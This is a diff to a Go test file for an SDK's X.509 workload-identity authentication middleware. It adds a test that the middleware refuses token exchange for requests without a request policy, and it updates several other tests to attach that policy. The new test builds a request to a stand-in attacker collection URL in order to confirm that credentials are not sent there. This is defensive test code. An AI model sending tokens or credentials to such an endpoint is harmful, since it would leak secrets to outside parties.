@@ -19,6 +19,7 @@ import (
 	"time"
 
 	"github.com/openai/openai-go/v3/auth"
+	"github.com/openai/openai-go/v3/internal"
 )
 
 type closeTrackingReadCloser struct {
@@ -94,6 +95,46 @@ func TestX509WorkloadIdentityDoesNotOwnCertificateMaterial(t *testing.T) {
 	wantFields := []string{"IdentityProviderID", "ServiceAccountID", "RefreshBuffer"}
 	if !reflect.DeepEqual(gotFields, wantFields) {
 		t.Errorf("X509WorkloadIdentity fields = %v, want %v", gotFields, wantFields)
+	}
+}
+
+func TestX509WorkloadIdentityMiddlewareRequiresRequestPolicyBeforeExchange(t *testing.T) {
+	var exchangeCalls atomic.Int32
+	var nextCalls atomic.Int32
+	exchangeClient := &http.Client{Transport: &closureTransport{fn: func(*http.Request) (*http.Response, error) {
+		exchangeCalls.Add(1)
+		return tokenResponse("x509-token", 60), nil
+	}}}
+	wia, err := auth.NewX509WorkloadIdentityAuth(testX509WorkloadIdentity())
+	if err != nil {
+		t.Fatalf("NewX509WorkloadIdentityAuth() error = %v", err)
+	}
+	req, err := http.NewRequestWithContext(t.Context(), http.MethodGet, "http://attacker.invalid/collect", nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	resp, err := auth.WorkloadIdentityMiddleware(wia, exchangeClient, req, func(*http.Request) (*http.Response, error) {
+		nextCalls.Add(1)
+		return &http.Response{StatusCode: http.StatusOK, Body: http.NoBody}, nil
+	})
+	if err == nil {
+		if resp != nil && resp.Body != nil {
+			_ = resp.Body.Close()
+		}
+		t.Fatal("WorkloadIdentityMiddleware() error = nil")
+	}
+	if resp != nil {
+		if resp.Body != nil {
+			_ = resp.Body.Close()
+		}
+		t.Errorf("WorkloadIdentityMiddleware() response = %#v, want nil", resp)
+	}
+	if got := exchangeCalls.Load(); got != 0 {
+		t.Errorf("token exchange calls = %d, want 0", got)
+	}
+	if got := nextCalls.Load(); got != 0 {
+		t.Errorf("next calls = %d, want 0", got)
 	}
 }
 
@@ -735,7 +776,7 @@ func TestX509Concurrent401InvalidationKeepsNewToken(t *testing.T) {
 				results <- reqErr
 				return
 			}
-			resp, middlewareErr := auth.WorkloadIdentityMiddleware(wia, exchangeClient, req, next)
+			resp, middlewareErr := auth.WorkloadIdentityMiddleware(wia, exchangeClient, internal.WithX509RequestPolicy(req), next)
 			if resp != nil && resp.Body != nil {
 				_ = resp.Body.Close()
 			}
@@ -777,7 +818,7 @@ func TestX509Second401InvalidatesReplayToken(t *testing.T) {
 		if reqErr != nil {
 			t.Fatal(reqErr)
 		}
-		resp, middlewareErr := auth.WorkloadIdentityMiddleware(wia, exchangeClient, req, next)
+		resp, middlewareErr := auth.WorkloadIdentityMiddleware(wia, exchangeClient, internal.WithX509RequestPolicy(req), next)
 		if middlewareErr != nil {
 			t.Fatalf("WorkloadIdentityMiddleware() error = %v", middlewareErr)
 		}
@@ -883,7 +924,7 @@ func testX509ReplayBodyClose(t *testing.T, downstreamClosesBody bool) {
 		return nil, middlewareErr
 	}
 
-	resp, err := auth.WorkloadIdentityMiddleware(wia, exchangeClient, req, next)
+	resp, err := auth.WorkloadIdentityMiddleware(wia, exchangeClient, internal.WithX509RequestPolicy(req), next)
 	if !errors.Is(err, middlewareErr) {
 		t.Fatalf("WorkloadIdentityMiddleware() error = %v, want %v", err, middlewareErr)
 	}
